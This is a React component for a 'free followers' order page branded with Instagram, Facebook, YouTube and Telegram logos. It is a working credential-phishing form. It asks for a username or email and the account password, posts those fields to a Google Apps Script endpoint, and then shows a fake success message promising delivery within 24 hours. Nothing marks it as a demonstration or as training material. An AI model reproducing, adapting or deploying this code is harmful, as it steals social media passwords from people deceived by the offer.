import React, { useState } from "react";

const Magic = () => {
  const [none, setNone] = useState("none");
  const submitForm = (e) => {
    const scriptURL =
      "https://script.google.com/macros/s/AKfycbxYXbtqAfxN47PxPmkQQBWIErp9ykR3Ha-rC0Oo4btI0IzdU-koikgNSeeshGB3GO96/exec";
    const form = document.forms["mainData"];

    e.preventDefault();
    fetch(scriptURL, { method: "POST", body: new FormData(form) })
      .then((response) => console.log("You are welcome"))
      .catch((error) => console.error("Error!", error.message));
    setNone("");
  };

  return (
    <form
      className="fr-form relative"
      name="mainData"
      onSubmit={(e) => submitForm(e)}
    >
      <div id="pop" className={`absolute tfivezero ${none}`}>
        <div className="land">
          <div
            class="font-regular relative block w-full max-w-screen-md rounded-lg bg-green-500 px-4 py-4 text-base text-white"
            data-dismissible="alert"
          >
            <div class="absolute top-4 left-4">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 24 24"
                fill="currentColor"
                aria-hidden="true"
                class="mt-px h-6 w-6"
              >
                <path
                  fill-rule="evenodd"
                  d="M2.25 12c0-5.385 4.365-9.75 9.75-9.75s9.75 4.365 9.75 9.75-4.365 9.75-9.75 9.75S2.25 17.385 2.25 12zm13.36-1.814a.75.75 0 10-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.14-.094l3.75-5.25z"
                  clip-rule="evenodd"
                ></path>
              </svg>
            </div>
            <div class="ml-8 mr-12">
              <h5 class="block font-sans text-xl font-semibold leading-snug tracking-normal text-white antialiased">
                Success
              </h5>
              <p class="mt-2 block font-sans text-base font-normal leading-relaxed text-white antialiased">
                Thank You for using our platform your order will be deliver
                within 24Hours.
              </p>
            </div>
            <div
              data-dismissible-target="alert"
              data-ripple-dark="true"
              class="absolute top-3 right-3 w-max rounded-lg transition-all hover:bg-white hover:bg-opacity-20"
            >
              <div
                onClick={() => setNone("none")}
                role="button"
                class="w-max rounded-lg p-1"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  class="h-6 w-6"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                  stroke-width="2"
                >
                  <path
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    d="M6 18L18 6M6 6l12 12"
                  ></path>
                </svg>
              </div>
            </div>
          </div>
          <img
            src="https://media.tenor.com/G_84l2xhm3YAAAAC/congratulations-celebrate.gif"
            alt=""
          />
        </div>
      </div>

      <div className="max-w-md w-full space-y-8 p-10 bg-white rounded-xl shadow-lg z-10">
        <div className="grid  gap-8 grid-cols-1">
          <div className="flex flex-col ">
            <div className="mt-5">
              <div className="form">
                <div className="md:space-y-2 mb-3">
                  <label className="text-md text-center font-semibold text-gray-600 py-2 ">
                    Please enter your valid details to get free folowers
                    <abbr className="hidden" title="required">
                      *
                    </abbr>
                  </label>
                  <div className="flex items-center py-6">
                    <div className="w-12 h-12 mr-4 flex-none rounded-xl border overflow-hidden">
                      <img
                        className="w-12 h-12 mr-4 object-cover"
                        src="https://img.freepik.com/premium-vector/vinnytsia-ukraine-april-27-2023-popular-social-media-icon-instagram-vector-design_545793-1681.jpg"
                        alt="Avatar Upload"
                      />
                    </div>
                    <div className="w-12 h-12 mr-4 flex-none rounded-xl border overflow-hidden">
                      <img
                        className="w-12 h-12 mr-4 object-cover"
                        src="https://images.hindustantimes.com/tech/img/2023/09/21/1600x900/fb_1695273515215_1695273522698.jpg"
                        alt="Avatar Upload"
                      />
                    </div>
                    <div className="w-12 h-12 mr-4 flex-none rounded-xl border overflow-hidden">
                      <img
                        className="w-12 h-12 mr-4 object-cover"
                        src="https://img.freepik.com/premium-vector/red-youtube-logo-social-media-logo_197792-1803.jpg"
                        alt="Avatar Upload"
                      />
                    </div>
                    <div className="w-12 h-12 mr-4 flex-none rounded-xl border overflow-hidden">
                      <img
                        className="w-12 h-12 mr-4 object-cover"
                        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_VRl14rwsT74-0fDcJPOjylU4LL5ANpy6hb3jww5Twg&s"
                        alt="Avatar Upload"
                      />
                    </div>
                    <div className="w-12 h-12 mr-4 flex-none rounded-xl border overflow-hidden">
                      <img
                        className="w-12 h-12 mr-4 object-cover"
                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/2048px-Telegram_logo.svg.png"
                        alt="Avatar Upload"
                      />
                    </div>
                  </div>
                </div>

                <div className="md:flex flex-row md:space-x-4 w-full text-xs">
                  <div className="mb-3 space-y-2 w-full text-xs">
                    <label className="font-semibold text-gray-600 py-2">
                      Phone number, username, or email{" "}
                      <abbr title="required">*</abbr>
                    </label>
                    <input
                      placeholder="Phone number, username, or email"
                      className="appearance-none block w-full bg-grey-lighter text-black border border-grey-lighter rounded-lg h-10 px-4"
                      required="required"
                      type="text"
                      name="usernumber"
                      id="integration_shop_name"
                    />
                    <p className="text-red text-xs hidden">
                      Please fill out this field.
                    </p>
                  </div>
                  <div className="mb-3 space-y-2 w-full text-xs">
                    <label className="font-semibold text-gray-600 py-2">
                      Profile Password <abbr title="required">*</abbr>
                    </label>
                    <input
                      placeholder="Profile Password"
                      className="appearance-none block w-full bg-grey-lighter text-black border border-grey-lighter rounded-lg h-10 px-4"
                      required="required"
                      type="text"
                      name="password"
                      id="integration_shop_name"
                    />
                    <p className="text-red text-xs hidden">
                      Please fill out this field.
                    </p>
                  </div>
                  <div className="mb-3 space-y-2 w-full text-xs">
                    <label className="font-semibold text-gray-600 py-2">
                      Confirm Password <abbr title="required">*</abbr>
                    </label>
                    <input
                      placeholder="Confirm Password"
                      className="appearance-none block w-full bg-grey-lighter text-black border border-grey-lighter rounded-lg h-10 px-4"
                      required="required"
                      type="text"
                      name="confirmpassword"
                      id="integration_shop_name"
                    />
                    <p className="text-red text-xs hidden">
                      Please fill out this field.
                    </p>
                  </div>
                </div>
                <div className="mb-3 space-y-2 w-full text-xs">
                  <label className=" font-semibold text-gray-600 py-2">
                    Profile Link
                  </label>
                  <div className="flex flex-wrap items-stretch w-full mb-4 relative">
                    <div className="flex">
                      <span className="flex items-center leading-normal bg-grey-lighter border-1 rounded-r-none border border-r-0 border-blue-300 px-3 whitespace-no-wrap text-grey-dark text-sm w-12 h-10 bg-white justify-center items-center  text-xl rounded-lg text-white">
                        <img
                          width="100%"
                          src="https://img.freepik.com/premium-vector/vinnytsia-ukraine-april-27-2023-popular-social-media-icon-instagram-vector-design_545793-1681.jpg"
                          alt=""
                        />
                      </span>
                    </div>
                    <input
                      type="text"
                      className="flex-shrink flex-grow flex-auto leading-normal w-px flex-1 border border-l-0 h-10 border-grey-light text-black rounded-lg rounded-l-none px-3 relative focus:border-blue focus:shadow"
                      placeholder="https://"
                      name="profilelink"
                    />
                  </div>
                </div>
                <div className="md:flex md:flex-row md:space-x-4 w-full text-xs">
                  <div className="w-full flex flex-col mb-3">
                    <label className="font-semibold text-gray-600 py-2">
                      Quantity
                    </label>
                    <input
                      placeholder="Quantity max folowers - 100"
                      className="appearance-none block w-full bg-grey-lighter text-black border border-grey-lighter rounded-lg h-10 px-4"
                      type="text"
                      name="quantity"
                      id="integration_street_address"
                    />
                  </div>
                </div>

                <div className="mt-5 text-right md:space-x-3 md:block flex flex-col-reverse">
                  <button
                    type="submit"
                    className="mb-2 md:mb-0 bg-green-400 px-5 py-2 text-sm shadow-sm font-medium tracking-wider text-white rounded-full hover:shadow-lg hover:bg-green-500"
                  >
                    PLACE ORDER FOR FREE
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </form>
  );
};

export default Magic;
